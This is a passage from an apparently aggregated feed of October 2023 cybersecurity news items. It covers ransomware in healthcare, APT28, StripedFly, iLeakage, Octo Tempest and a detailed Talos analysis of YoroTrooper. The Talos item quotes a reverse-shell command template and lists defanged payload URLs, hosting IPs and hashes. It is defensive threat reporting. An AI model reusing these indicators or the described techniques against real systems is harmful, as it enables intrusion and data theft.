      "text": " UK / EMEA News Reporter, Infosecurity MagazineA leading US cybersecurity agency has published a new set of online resources designed to help IT security leaders in the healthcare sector to improve their organization’s security posture.The Cybersecurity Toolkit for Healthcare and Public Health features a range of information, guidance and practical tooling to help reduce cyber-risk and the “likelihood of successful cyber-incursions” in the sector.It has been jointly delivered by the Cybersecurity and Infrastructure Security Agency (CISA), the Department of Health and Human Services (HHS) and the Health Sector Coordinating Council (HSCC) Cybersecurity Working Group.It includes:CISA deputy director, Nitin Natarajan, explained that in 2023 to date, CISA has been forced to notify over 65 US healthcare organizations about early-stage ransomware activity on their networks.“Adversaries see healthcare and public health organizations as high value yet relatively easy targets – or what we call target rich, cyber poor,” he added.“Given that healthcare organizations have a combination of personally identifiable information, financial information, health records, and countless medical devices, they are essentially a one-stop shop for an adversary.”HHS deputy secretary, Andrea Palm, explained that the severity and volume of attacks against hospitals and providers had surged in recent years.“These attacks expose vulnerabilities in our healthcare system, degrade patient trust, and ultimately endanger patient safety. The more they happen, and the longer they last, the more expensive and dangerous they become,” she continued.“HHS is working closely with CISA and our industry partners to deliver the tools, resources, and guidance needed to help healthcare organizations, especially our under-resourced hospitals and health centers, mount a strong cyber-defense and protect patient lives.”"
   },
   {
      "time": "2023-10-27",
      "title": "France says Russian state hackers breached numerous critical networks",
      "text": " The Russian APT28 hacking group (aka 'Strontium' or 'Fancy Bear') has been targeting government entities, businesses, universities, research institutes, and think tanks in France since the second half of 2021.The Russian hackers have been compromising peripheral devices on critical networks of French organizations and moving away from utilizing backdoors to evade detection.ANSSI has mapped the TTPs (techniques, tactics, and procedures) of APT28, reporting that the threat group uses brute-forcing and leaked databases containing credentials to breach accounts and Ubiquiti routers on targeted networks.In one case from April 2023, the attackers ran a phishing campaign that tricked the recipients into running PowerShell that exposed their system configuration, running processes, and other OS details.Between March 2022 and June 2023, APT28 sent emails to Outlook users that exploited the then zero-day vulnerability now tracked as CVE-2023-23397, placing the initial exploitation a month earlier than what was recently reported.During this period, the attackers also exploited CVE-2022-30190 (aka \"Follina\") in the Microsoft Windows Support Diagnostic Tool and CVE-2020-12641, CVE-2020-35730, CVE-2021-44026 in the Roundcube application.The tools used in the first stages of the attacks include the Mimikatz password extractor and the reGeorg traffic relaying tool, as well as the Mockbin and Mocky open-source services.ANSSI also reports that APT28 uses a range of VPN clients, including SurfShark, ExpressVPN, ProtonVPN, PureVPN, NordVPN, CactusVPN, WorldVPN, and VPNSecure.As a cyber-espionage group, data access and exfiltration are at the core of Strontium's operational goals.ANSSI has observed the threat actors retrieving authentication information using native utilities and stealing emails containing sensitive information and correspondence.Specifically, the attackers exploit CVE-2023-23397 to trigger an SMB connection from the targeted accounts to a service under their control, allowing the retrieval of the NetNTLMv2 authentication hash, which can be used on other services, too.APT28's command and control server (C2) infrastructure relies on legitimate cloud services, such as Microsoft OneDrive and Google Drive, to make the exchange less likely to raise any alarms by traffic monitoring tools.Finally, ANSSI has seen evidence that the attackers collect data using the CredoMap implant, which targets information stored in the victim's web browser, such as authentication cookies.Mockbin and the Pipedream service are also involved in the data exfiltration process.ANSSI emphasizes a comprehensive approach to security, which entails assessing risks. In the case of the APT28 threat, focusing on email security is crucial.The agency's key recommendations around email security include:"
   },
   {
      "time": "2023-10-27",
      "title": "Nigerian Police dismantle cybercrime recruitment, mentoring hub",
      "text": " The Nigerian Police Form has arrested six suspects and dismantled a mentoring hub linked to cybercrime activities, including business email compromise, romance, and investment scams.After receiving intelligence and investigating a group of individuals suspected of cybercrime, six individuals were arrested on September 13th, 2023, in the Dantata estate area.As part of this operation the Police state that they dismantled a cybercrime recruitment and mentoring hub in Abuja, the Federal Capital Territory (FCT), as well as seized several digital devices believed to be used in criminal activities.The authorities say that the threat actors confessed to their involvement in cybercrime activities, including identity theft, hacking and trading of hacked Facebook accounts, romance scams, computer-related forgery, and other computer-related fraud.Inspector General of Police Ag. IGP Olukayode Egbetokun, NPM, Ph.D., requested that the public, family, friends, and religious groups condemn this activity and report suspicious online activity to the police to help combat this type of crime.\"We need to break the conspiracy of silence and expose the evil doers in our society.\"All online users should be careful and suspicious of social engineering attacks, whether via email or social media, requesting that you provide sensitive information or send money."
   },
   {
      "time": "2023-10-27",
      "title": "Android adware apps on Google Play amass two million installs",
      "text": " Several malicious Google Play Android apps installed over 2 million times push intrusive ads to users while concealing their presence on the infected devices.In their latest monthly mobile threat report, Doctor Web's analysts identified trojans on Google Play associated with the 'FakeApp,' 'Joker,' and the 'HiddenAds' malware families.Of particular interest are the following four adware (HiddenAds) apps disguised as games:Dr. Web explains that once victims install these apps on their devices, they hide by replacing their icons with that of Google Chrome or using a transparent icon image to create empty space in the app drawer.These apps run stealthily in the background upon launch, abusing the browser to launch ads and generate revenue for their operators.The analysts also discovered several apps belonging to the FakeApp family, which direct users to investment scam sites.Some notable examples of those are:Finally, the antivirus team spotted two Joker family apps on Google Play, which subscribe users to premium paid services:All the apps presented in this report have been removed from Google Play by the time of writing. Still, users who might have installed them in the past must delete them immediately and perform a complete device scan using Play Protect and a mobile antivirus tool.To avoid downloading malicious software from Google Play, minimize the apps you install to the minimum required, carefully read user reviews, and perform checks to ensure the publisher is trustworthy."
   },
   {
      "time": "2023-10-27",
      "title": "StripedFly malware framework infects 1 million Windows, Linux hosts",
      "text": " A sophisticated cross-platform malware platform named StripedFly flew under the radar of cybersecurity researchers for five years, infecting over a million Windows and Linux systems during that time.Kaspersky discovered the true nature of the malicious framework last year, finding evidence of its activity starting in 2017, with the malware wrongly classified as just a Monero cryptocurrency miner.While it's unclear if this malware framework was utilized for revenue generation or cyber espionage, Kaspersky says its sophistication indicates that this is an APT (advanced persistent threat) malware.The StripedFly malware framework was first discovered after Kaspersky found the platform's shellcode injected in the WININIT.EXE process, a legitimate Windows OS process that handles the initialization of various subsystems.After investigating the injected code, they determined it downloads and executes additional files, such as PowerShell scripts, from legitimate hosting services like Bitbucket, GitHub, and GitLab, including PowerShell scripts.Further investigation showed that infected devices were likely first breached using a custom EternalBlue SMBv1 exploit that targeted internet-exposed computers.The final StripedFly payload (system.img) features a custom lightweight TOR network client to protect its network communications from interception, the ability to disable the SMBv1 protocol, and spread to other Windows and Linux devices on the network using SSH and EternalBlue.The malware's command and control (C2) server is on the TOR network, and communication with it involves frequent beacon messages containing the victim's unique ID.For persistence on Windows systems, StripedFly adjusts its behavior based on the level of privileges it runs on and the presence of PowerShell.Without PowerShell, it generates a hidden file in the %APPDATA% directory. In cases where PowerShell is available, it executes scripts for creating scheduled tasks or modifying Windows Registry keys.On Linux, the malware assumes the name 'sd-pam'. It achieves persistence using systemd services, an autostarting .desktop file, or by modifying various profile and startup files, such as  /etc/rc*, profile, bashrc, or inittab files.The Bitbucket repository delivering the final stage payload on Windows systems indicates that between April 2023 and September 2023, there have been nearly 60,000 system infections.It is estimated that StripedFly has infected at least 220,000 Windows systems since February 2022, but stats from before that date are unavailable, and the repository was created in 2018.The malware operates as a monolithic binary executable with pluggable modules, giving it an operational versatility often associated with APT operations.Here's a summary of StripedFly's modules from Kaspersky's report:The presence of the Monero crypto miner is considered a diversion attempt, with the primary objectives of the threat actors being data theft and system exploitation facilitated by the other modules.\"Notably, the Monero cryptocurrency mined by this module reached its peak value at $542.33 on January 9, 2018, compared to its 2017 value of around $10. As of 2023, it has maintained a value of approximately $150.\"\"Kaspersky experts emphasize that the mining module is the primary factor enabling the malware to evade detection for an extended period.\"The 'repeatable tasks module' also suggests that the unidentified attackers could be interested in revenue generation for some victims."
   },
   {
      "time": "2023-10-27",
      "title": "New iLeakage attack steals emails, passwords from Apple Safari",
      "text": " Academic researchers created a new speculative side-channel attack they named iLeakage that works on all recent Apple devices and can extract sensitive information from the Safari web browser.iLeakage is the first demonstration of a speculative execution attack against Apple Silicon CPUs and the Safari browser. It can be used to retrieve with \"near perfect accuracy\" data from Safari,  as well as Firefox, Tor, and Edge on iOS.iLeakage was developed by a team of academics from Georgia Tech, University of Michigan, and Ruhr University Bochum who examined Safari's side-channel resilience and managed to bypass existing countermeasures by implementing a timerless and architecture-agnostic method based on race conditions.The researchers focused on reading sensitive information from Safari and were able to steal data by creating a primitive that can speculatively read and leak any 64-bit pointer in the address space Apple's browser uses for the rendering process.They achieved this by defeating the side-channel protections Apple implemented in its browser, e.g. low-resolution timer, compressed 35-bit addressing, and value poisoning.The researchers also bypassed the site isolation policy in Safari, which separates websites into different address spaces based on their effective top-level domain (eTLD) plus one subdomain.They used a new technique that uses the JavaScript window.open API allows an attacker page to share the same address space as arbitrary victim pages.By using using speculative type confusion to bypass Apple’s compressed 35-bit addressing and value poisoning countermeasures, the researchers could leak sensitive data from the target page, such as passwords and emails.The proof-of-concept code for the attack is in JavaScript and WebAssembly, the two programming languages for delivering dynamic web content.The video below shows how Gmail messages in Safari running an iPad were retrieved using the iLeakage attack. The basic requirement for the attack to work is that the victim user interacts with the attacker's page.The researchers used the same method to retrieve a password for an Instagram test account that was auto-filled in the Safari web browser using the LastPass password management service.In another experiment, the researchers demonstrated how the iLeakage attacks also works on Chrome for iOS and were able to retrieve the YouTube watch history.They explain that Apple's policy forces all third-party iOS browsers to be overlays on top of Safari and use Apple browser's JavaScript engine.This mechanism, present in all modern CPUs, dramatically improves performance; however, design flaws can cause data leaks, as proven by the Meltdown and Spectre attacks disclosed almost six years ago.iLeakage impacts all Apple devices released from 2020 that are powered by Apple's A-series and M-series ARM processors.The attack is largely undetectable, leaving no traces on the victim's system in the form of logs, apart from maybe an entry of the attacker's webpage in the browser cache.Nevertheless, the researchers underline that the attack is difficult to carry out \"and requires advanced knowledge of browser-based side-channel attacks and Safari's implementation.\"iLeakage was reported privately to Apple on September 12, 2022 and the company developed the following mitigations for macOS:The mitigation comes with the warning that it might introduce some instability. If users want to disable it, they can do it from the debug menu by running in the terminal the command defaults write com.apple.Safari IncludeInternalDebugMenu 0.Besides the actual implications of iLeakage, this research highlights the potential speculative execution risks in emerging ARM-based platforms that have not been scrutinized as heavily as x86 architectures."
   },
   {
      "time": "2023-10-27",
      "title": "Microsoft: Octo Tempest is one of the most dangerous financial hacking groups",
      "text": " Microsoft has published a detailed profile of a native English-speaking threat actor with advanced social engineering capabilities it tracks as Octo Tempest, that targets companies in data extortion and ransomware attacks.Octo Tempest’s attacks have steadily evolved since early 2022, expanding their targeting to organizations providing cable telecommunications, email, and tech services, and partnering with the ALPHV/BlackCat ransomware group.The threat actor was initially observed selling SIM swaps and stealing accounts of high-profile individuals with cryptocurrency assets.In late 2022, Octa Tempest moved to phishing, social engineering, resetting passwords en-masse for the customers of breached service providers, and data theft.Earlier this year, the threat group attacked companies in the gaming, hospitality, retail, manufacturing, technology, and financial sectors, as well as managed service providers (MSPs).After becoming an ALPHV/BlackCat affiliate, Octa Tempest deployed the ransomware both to steal and to encrypt victim data.The group used its accumulated experience to build more advanced and aggressive attacks and also started to monetize intrusions by extorting victims after stealing data.Microsoft says that Octo Tempest also used direct physical threats in some cases to obtain logins that would advance their attack.In an odd turn of events, Octo Tempest became an affiliate of the ALPHV/BlackCat ransomware-as-a-service (RaaS) operation, Microsoft says, and by June they started deploying both the Windows and Linux ransomware payloads, focusing on VMware ESXi servers lately.The more recent attacks from this group target organizations in a variety of sectors, including gaming, natural resources, hospitality, consumer products, retail, managed service providers, manufacturing, law, technology, and financial services.Microsoft assesses that Octo Tempest is a well-organized group that includes members with extensive technical knowledge and multiple hand-on-keyboard operators.The hackers often gain initial access through advanced social engineering that targets accounts of technical administrators (e.g. support and help desk staff) with enough permissions to further the attack.They research the company to identify the targets they can impersonate to the level of mimicking the speech patterns of the individual in phone calls.By doing so, they trick technical administrators into performing password resets and reset multi-factor authentication (MFA) methods.Other methods for initial access include:Once they get sufficient access, Octo Tempest hackers start the reconnaissance stage of the attack by enumerating hosts and services and collecting information that would permit abusing legitimate channels to progress the intrusion.“Initial bulk-export of users, groups, and device information is closely followed by enumerating data and resources readily available to the user’s profile within virtual desktop infrastructure or enterprise-hosted resources” - MicrosoftOcto Tempest then proceeds to explore the infrastructure, enumerating access and resources across cloud environments, code repositories, server and backup management systems.To escalate privileges, the threat actor again turns to social engineering, SIM-swapping, or call forwarding, and initiates a self-service password reset of the target’s account.During this step, the hackers build trust with the victim by using compromised accounts and demonstrating an understanding of the company’s procedures. If they have a manager’s account, they approve requests for increased permissions themselves.For as long as they have access, Octo Tempest continues to look for additional credentials to expand their reach. They use tools like Jercretz and TruffleHog to automate the search for plaintext keys, secrets, and passwords across code repositories.To keep their tracks hidden, the hackers also target the accounts of security personnel, which allows them to disable security products and features.“Using compromised accounts, the threat actor leverages EDR and device management technologies to allow malicious tooling, deploy RMM software, remove or impair security products, data theft of sensitive files (e.g. files with credentials, signal messaging databases, etc.), and deploy malicious payloads” - MicrosoftAccording to Microsoft, Octo Tempest tries to hide their presence on the network by suppressing alerts of changes and modifying the mailbox rules to delete emails that could raise the victim’s suspicions of a breach.The researchers provide the following additional tools and techniques that Octo Tempest uses in their attacks:The hackers also move stolen data to their servers using a unique technique, which involves Azure Data Factory and automated pipelines to blend in with typical big data operations.To export SharePoint document libraries and transfer the files quicker, the attacker has been often observed to register legitimate Microsoft 365 backup solutions such as Veeam, AFI Backup, and CommVault. Microsoft notes that detecting or hunting for this threat actor in an environment is not an easy task due to the use of social engineering, living-off-the-land techniques, and the diverse tooling.However, the researchers provide a set of general guidelines that could help detect malicious activity, which starts with monitoring and reviewing identity-related processes, Azure environments, and endpoints.Octo Tempest is financially motivated and achieves its goals through stealing cryptocurrency, data theft extortion, or encrypting systems and asking for a ransom."
   },
   {
      "time": "2023-10-27",
      "title": "Record-Breaking 100 Million RPS DDoS Attack Exploits HTTP/2 Rapid Reset Flaw",
      "text": " The total number of HTTP DDoS attack requests in the quarter surged to 8.9 trillion, up from 5.4 trillion in Q2 2023 and 4.7 trillion in Q1 2023. The number of attack requests in Q4 2022 stood at 6.5 trillion.HTTP/2 Rapid Reset (CVE-2023-44487) came to light earlier this month following an industry-wide coordinated disclosure that delved into DDoS attacks orchestrated by an unknown actor by leveraging the flaw to target various providers such as Amazon Web Services (AWS), Cloudflare, and Google Cloud.\"Botnets that leverage cloud computing platforms and exploit HTTP/2 are able to generate up to x5,000 more force per botnet node,\" Cloudflare noted. \"This allowed them to launch hyper-volumetric DDoS attacks with a small botnet ranging 5-20 thousand nodes alone.\"Some of the top industries targeted by HTTP DDoS attacks include gaming, IT, cryptocurrency, computer software, and telecom, with the U.S., China, Brazil, Germany, and Indonesia accounting for the biggest sources of application layer (L7) DDoS attacks.On the other hand, the U.S., Singapore, China, Vietnam, and Canada emerged as the main targets of HTTP DDoS attacks.Another notable change is the decrease in ransom DDoS attacks, which Cloudflare said \"is because threat actors have realized that organizations will not pay them.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-27",
      "title": "Iranian Group Tortoiseshell Launches New Wave of IMAPLoader Malware Attacks",
      "text": " The Iranian threat actor known as Tortoiseshell has been attributed to a new wave of watering hole attacks that are designed to deploy a malware dubbed IMAPLoader.\"It uses email as a [command-and-control] channel and is able to execute payloads extracted from email attachments and is executed via new service deployments.\"The latest set of attacks between 2022 and 2023 entails embedding malicious JavaScript in compromised legitimate websites to gather more details about the visitors, including their location, device information, and time of visits.These intrusions focused primarily on the maritime, shipping and logistics sectors in the Mediterranean, in some cases leading to the deployment of IMAPLoader as a follow-on payload should the victim be deemed a high-value target.IMAPLoader is said to be a replacement to a Python-based IMAP implant Tortoiseshell previously used in late 2021 and early 2022, owing to the similarities in the functionality.In an alternate attack chain, a Microsoft Excel decoy document is used as an initial vector to kick-start a multi-stage process to deliver and execute IMAPLoader, indicating that the threat actor is using a variety of tactics and techniques to realize its strategic goals. PwC said it also discovered phishing sites created by Tortoiseshell, some of which are aimed at the travel and hospitality sectors within Europe, to conduct credential harvesting using fake Microsoft sign-in pages.\"This threat actor remains an active and persistent threat to many industries and countries, including the maritime, shipping, and logistics sectors within the Mediterranean; nuclear, aerospace, and defense industries in the U.S. and Europe; and IT managed service providers in the Middle East,\" PwC said.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-27",
      "title": "Critical Flaw in NextGen's Mirth Connect Could Expose Healthcare Data",
      "text": " Additional technical details about the flaw have been withheld in light of the fact that Mirth Connect versions going as far back as 2015/2016 have been found to be vulnerable to the issue.While CVE-2023-37679 was described by its maintainers as only affecting servers running Java 8, Horizon3.ai's analysis found that all instances of Mirth Connect, regardless of the Java version, were susceptible to the problem.The criticality of the issue arises from the fact that Mirth Connect appears to be most commonly deployed on Windows endpoints with SYSTEM user privileges, potentially enabling threat actors to completely take over vulnerable installations.Given the ease with which the vulnerability can be trivially abused, coupled with the fact that the exploitation methods are well known, it's recommended to update Mirth Connect, particularly that are publicly accessible over the internet, to version 4.4.1 as soon as possible to mitigate potential threats.Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-27",
      "title": "Kazakhstan-associated YoroTrooper disguises origin of attacks as Azerbaijan",
      "text": " Talos assesses with high confidence that YoroTrooper operators are likely based in Kazakhstan based on their language preferences, use of Kazakhstani currency and very limited targeting of Kazakhstani entities, which only included the government’s Anti-Corruption Agency. Our primary observation that points toward the actor being of Kazakh origin is that they speak Kazakh and Russian, both of which are official languages of Kazakhstan. YoroTrooper frequently visits websites written in Kazakh and has used Russian in debugging and logging messages in their custom Python remote access trojans (RATs). For example, we have seen phrases such as “Сохраняю в {save_dir}” or “Файл загружен!\\nИмя” that translate to “I save in {save_dir}” and “File uploaded!\\nName” respectively, and the translation of output of commands to CP866 — the code page for Cyrillic. Starting in June 2023, we saw this actor using Uzbek in their implants, another popular language in Kazakhstan, enabling us to narrow down their country of origin. While this may be an attempt at generating false flags to masquerade as an Uzbek adversary, it is highly likely that YoroTrooper operators are simply well-versed in Kazakh, Russian and Uzbek languages.A second observation that supports our assessment of YoroTrooper’s strong ties to Kazakhstan  is the involvement of Kazakhstani currency in their operations. The threat actor primarily relies on using cryptocurrency to pay for operating infrastructure such as domains and servers for hosting their lures, payloads and decoys, and regularly checks for currency conversion rates between Kazakhstani Tenge (KZT), Kazakhstan’s official currency and Bitcoin (BTC) on Google.The threat actor also uses online exchanges, such as alfachange[.]com, which converts money from Kazakhstani Tenge to Bitcoin via their Visa and Mastercard cards:Talos’ research found that YoroTrooper has a special defensive interest in repeatedly evaluating the security posture of the website of the Kazakhstani state-owned email service, mail[.]kz. YoroTrooper will regularly conduct security scans of mail[.]kz but has never registered any look-a-like domains or created credential harvesting pages spoofing the site, tactics the threat actor commonly uses when attempting to target an online service or its users. The image below shows bookmarks pertaining to the evaluation of mail[.]kz’s security posture saved on a browser used by YoroTrooper, indicating that the threat actor frequently visits these links to monitor the website for potential security vulnerabilities.This monitoring activity indicates YoroTrooper values mail[.]kz, as they have conducted similar security scanning for their own malicious infrastructure to verify that it is not vulnerable to exploitation. For example, YoroTrooper queried IP address 168[.]100[.]8[.]242 on Shodan, which hosted domain mail[.]asco[.]az-link[.]email on July 11, 2022 that was used by YoroTrooper to target entities in Azerbaijan in November 2022:YoroTrooper checking one of their own IP addresses in Shodan.Finally, Talos’ analysis of YoroTrooper’s victimology found that the only institution targeted in Kazakhstan was the government’s Anti-Corruption Agency. YoroTrooper facilitated this attack by creating a malicious subdomain mail[.]antikor[.]gov[.]kz[.]openingfile[.]net, that spoofed the legitimate government domain antikor[.]gov[.]kz:. We assess with high confidence that YoroTrooper made numerous efforts to disguise their origin by hosting a majority of their infrastructure in Azerbaijan while still targeting institutions in Azerbaijan, using malicious sub-domains such as:YoroTrooper employs numerous tactics to obfuscate the origin of their activity, attempting to appear as if they are located in Azerbaijan. We observed that most of YoroTrooper’s operations are routed via Azerbaijan, though notably, the threat actor does not appear to speak the Azerbaijani language. Intelligence obtained by Talos indicates the adversary regularly translates information from Azerbaijani to Russian, the second official language in Kazakhstan.YoroTrooper using Google Translate to convert text from Azerbaijani to Russian for an account verification message.Furthermore, the operator drafts lures in Russian and then translates them to Azerbaijani to use in their phishing attacks:YoroTrooper makes an effort to have their operations appear as if they originate from Azerbaijan, looking to use VPN exit nodes in the country:Finally, we have also seen the threat actor searching for random contact information for Azerbaijani individuals, likely to use when setting up their infrastructure and tools:YoroTrooper’s targeting of government entities in these countries may indicate the operators are motivated by Kazakh state interests or working under the direction of the Kazakh government. It is also possible, however, that the actors are simply motivated by financial gain achieved by selling restricted state information. Talos is pursuing further research on YoroTrooper’s intelligence collection goals to ascertain the group’s potential state sponsorship. A number of prominent and successful YoroTrooper intrusions took place in recent months, beginning in June 2023 when the adversary compromised a Tajiki national. Although we could not determine the identity of the victim, Talos assesses that the victim is associated with the Tajik government, based on the nature of the data that YoroTrooper exfiltrated from them, which amounted to 165MB of documents. Many of these documents consisted of government certificates and affidavits, appearing to belong to someone who has visibility into government personnel management and welfare.YoroTrooper consistently relies on vulnerability scanners such as Acunetix and open-source data from search engines such as Shodan to locate and infiltrate a target’s infrastructure. This exercise turned out to be extremely fruitful for YoroTrooper, who from May to July 2023, successfully compromised three state-owned Tajiki and Kyrgyzstani websites and hosted malware payloads on them, with some malware still being hosted as of September 2023. The first website compromised in May 2023 was tpp[.]tj, which is managed by the country’s Chamber of Commerce and Industry of the Republic of Tajikistan.Subsequently, in July, YoroTrooper compromised and hosted malware on akn[.]tj, another state-owned website belonging to the Drug Control Agency under the President of the Republic of Tajikistan, as well as kyrgyzkomur[.]gov[.]kg, which belongs to Kyrgyzstan's state-owned coal enterprise.YoroTrooper also compromised a user from the Ministry of Transport and Roads of the Kyrgyz Republic, successfully harvesting some browser credentials from the user.YoroTrooper began its campaign to target Uzbeki government entities as early as January 2023. About eight months of aggressive attack attempts yielded success in August 2023, when YoroTrooper successfully compromised a high-ranking official from the Uzbek Ministry of Energy. While Talos confirmed the compromise, we could not determine what data was stolen from this individual.The following timeline provides an updated view and details of various geographies targeted since June 2023. TimeframeTargeted geographySalient TTPsSeptember 2023Tajikistan• Used an agreement statement between Bulgaria and Tajikistan as a lure.• Reused compromised Tajiki website for the Chamber of Commerce and Industry to host malware.• Deployed PowerShell-based implants and used Telegram APIs.August 2023Kyrgyzstan• Used a Kyrgyz Ministry of Transport circular as a lure/decoy document.• Used attacker-owned infrastructure to host malware.• Targeted and compromised an Uzbek Ministry of Energy senior official.• Reused custom-built reverse shell EXEs first seen in June 2023.• Reused a PyInstaller-wrapped, Python-based Google Chrome credential stealer that was first seen in January 2023, though this version did not include an upload capability.July 2023Tajikistan and Kyrgyzstan• Tajik Drug Control Agency’s website  akn[.]tj compromised to host payloads.• Kyrgyz state-owned coal enterprise KyrgyzKomur’s website, kyrgyzkomur[.]gov[.]kg, compromised and used to host malware.June 2023Tajikistan• Takij Ministry of Foreign Affairs targeted using the following lures:• Publication from the International Atomic Energy Agency (IAEA) and OECD Nuclear Energy Agency (NEA) on  Uranium: Resources, Production and Demand.• Used a compromised Tajiki website for the Chamber of Commerce and Industry to host malware.• First instance of deploying custom-built reverse shell EXEs.• Python implants ported to PowerShell and used Telegram APIs. YoroTrooper relies heavily on learning-on-the-go to carry on their malicious activities. We’ve observed the operator constantly attempting to buy new tools, such as VPN connections. Our research also indicated that the group actively relies on vulnerability scanners, such as Acunetix, and open-source data, such as the information available on Shodan, to locate and infiltrate the public-facing servers of their targets.YoroTrooper frequently conducts open-source searches of infrastructure they are interested in targeting, using search engines such as Google, Shodan and Censys to find vulnerabilities and leakages in a target's infrastructure. This research includes searching for vulnerable PHP-based servers and identifying content management systems (CMS) to find open directories.  Talos identified a number of operational email accounts and other infrastructure used by YoroTrooper to facilitate their operations. YoroTrooper primarily uses the email address “anadozz[at]tuta[.]io” to register and purchase tools and services such as VPN accounts. For example, in 2022, the actors used this email address to obtain a subscription to NordVPN, valid from 2022 to 2025, from darkstore[.]su:YoroTrooper has also extensively used and maintained access to two other email addresses, “n.ayyubov[at]mail[.]ru” and “danyjackson120293[at]proton[.]me”, via their remote machines. It is unclear if these email addresses actually belong to the operators or are just compromised accounts being leveraged by YoroTrooper.A couple of months before purchasing the NordVPN account, YoroTrooper configured and purchased a VPS instance from netx[.]hosting for $16 USD a month. This is likely another remote machine that the threat actor used to expand their malicious operations.Talos also found that YoroTrooper accesses their malicious infrastructure several times over the course of their campaigns in order to upload malware and access URLs hosted on their servers, such as: YoroTrooper regularly sends spearphishing messages to victims that direct to attacker-controlled pages designed to harvest the target’s credentials. The operators collect and deploy phishing pages on servers specific to a target country. Some of the malicious credential-harvesting pages found on YoroTrooper’s VPS systems were:The practice of credential-harvesting runs complimentary to YoroTrooper’s malware-based operations with the end goal being data theft. The vast majority of YoroTrooper malware analyzed by Talos belongs to different families of information stealers.  After Talos released our report on YoroTrooper earlier this year, we have seen the operators make slight adjustments to their infection chains. The infection mechanisms have become more modular with:While many of their mechanisms and implants have seen slight variation, Talos assesses with high confidence that YoroTrooper is changing their final malware implants and looking to develop and adopt new malware families into their arsenal.As part of their exercise of retooling, YoroTrooper has also ported their custom-built Python implants that were previously packaged into executables using frameworks such as Nuitka and PyInstaller, to PowerShell scripts that are now directly run from the central HTA script.The new infection chain is outlined in the graphic below. YoroTrooper has started using a simple, custom-built, Windows executable-based interactive reverse shell to run commands on infected endpoints via cmd[.]exe: Since February 2023, YoroTrooper has ported their Python-based RAT to PowerShell. This is likely an attempt to reduce the footprint of the malware on the infected systems, as a Python-based RAT packaged into an EXE using PyInstaller or NUITKA usually results in a binary of a few megabytes, however the same code in PowerShell is only a few kilobytes and runs natively on the system. The core functionality remains the same, with the RAT taking commands and exfiltrating data to Telegram-based C2s.Python-based RAT (left) vs. the ported PowerShell code (right). In July 2023, YoroTrooper began experimenting with multiple types of delivery vehicles for their implants and adopting other malware families into their arsenal.One such example is a Windows executable that is designed to work in lieu of the entire LNK and HTA-based infection chain previously used by the actors. This executable is a PyInstaller-wrapped binary where the Python code will:We found one sample from July 2023 that downloads and displays a decoy document from the KyrgyzKomur website, which belongs to the coal division within the Kyrgyz Ministry of Energy. This document is a memo on a transportation agreement between the Republic of Bulgaria and Tajikistan. The sample consists of a mere 13 lines of Python code packed into a 6MB PyInstaller binary: As recently as September 2023, YoroTrooper began using a Rust-based implant that opens an interactive reverse-shell via the command:cmd.exe /d /c <command_from_C2>Their Golang-based implants are ports of the Python-based RAT that uses Telegram channels for file exfiltration and C2 communication. So far we have seen the Python-based RAT already being ported to two other languages, PowerShell and Golang.GoLang implant checking for “/run” command from the C2. Ways our customers can detect and block this threat are listed below.8131bd594aff4f4e233ac802799df3422f423dc28e96646a09a2656563c4ad7ca3b1c3faa287f6ba2f307af954bb2503b787ae2cd59ec65e0bdd7a0595ea8c7eEd8c04a3e2d95d5ad8e2327a56d221715f06ed84eb9dc44ff86acff4076629d79b81c5811ef3742cd4f45b6c3ba1ace70a0ce661acc42d974beaeddf307dd53dB6a5d6696cbb1690f75b0d9a42df8cefd444cfd3749be474535948a70ff2efd2F55b41ca475f411af10eaf082754c6e8b7a648da4fa72c23cbfea9fa13a91d88E0c7479e36b20cd7c3ca85966968b258b1148eb645a544230062ec5dff563258ab6a8718dffbe48fd8b3a74f4bcb241cde281acf9e378b0c2370a040e4d827daa5d8924f7f285f907e7e394635f31564a371dd58fad8fc621bacd5a55ca5929bE95e64e7ba4ef18df0282df15fc97cc76ba57ea250a0df51469337f561cc67d3832d58d9e067730a5705c8c307fd51c044d9697911043be9564593e05216e82aDa75326cfebcca12c01e4a51ef77547465e03316c5f6fbce901ddcfe6425b7531e350b316cbc42917f10f6f12fa2a0b8ed2fa6b0159c36141bce18edb6ea7aa057d0336c0dbaf455229d2689bf82f9678eb519e017d40ba60a6d6b90f87321f830a969fa0492479b1c6ef6d23f8fcccf3d7af35b235d74cab2c0c2fc8c212ad45a6b089b1d2dd66948f24ed2d9464ce61942c19e98922dd77d36427f6cded634a25db1457cf6b52be481929755dd9699ed8d009aa30295b2bf54710cb07a2f2256fc680799999e38ce84c80e27788839f35ee817816de15b90aa39332fcc5aee37c369f9a9cac898af2668b1287dea34c753119071a1c447b0bfecd17170934093829ee93688a31f90572316ecb21702eab04886c8899c0a59deda3b2f96c4be0a9908d8c4de050149883ca17625bbe97830ba61c3fe6b0ef704c65361027add1828e2df0ad76ea503af7206447e40482669bb25624a60b0f77743cd70f819f6941be28004afc2c7c8248a86b5857a35ab303beb33c704640852741b925558a18921c20539fc019a9127285ca43b35610f8ecb0151872cdd50acdaa12c23722db4eac90e866f5ad8af37b43f5e9459e59ee1e7e2cbb284703c0ef7b1a13ee723168[.]100[.]8[.]2146[.]161[.]27[.]151hxxp[://]46[.]161[.]27[.]151:80/c1[.]exehxxp[://]46[.]161[.]40[.]164/wwser[.]exehxxp[://]tpp[.]tj/T/rat[.]phphxxps[://]tpp[.]tj/T/rat[.]phphxxp[://]46[.]161[.]40[.]164/resoluton[.]exehxxp[://]tpp[.]tj/285/file[.]jshxxp[://]tpp[.]tj/285/png[.]phphxxp[://]tpp[.]tj/285/startpng[.]jshxxp[://]tpp[.]tj/285/uap[.]txthxxp[://]tpp[.]tj/285/update[.]htahxxp[://]168[.]100[.]8[.]21/file[.]jshxxp[://]168[.]100[.]8[.]21/mshostss[.]rarhxxp[://]168[.]100[.]8[.]21/png[.]phphxxp[://]168[.]100[.]8[.]21/rat[.]jshxxp[://]168[.]100[.]8[.]21/rat[.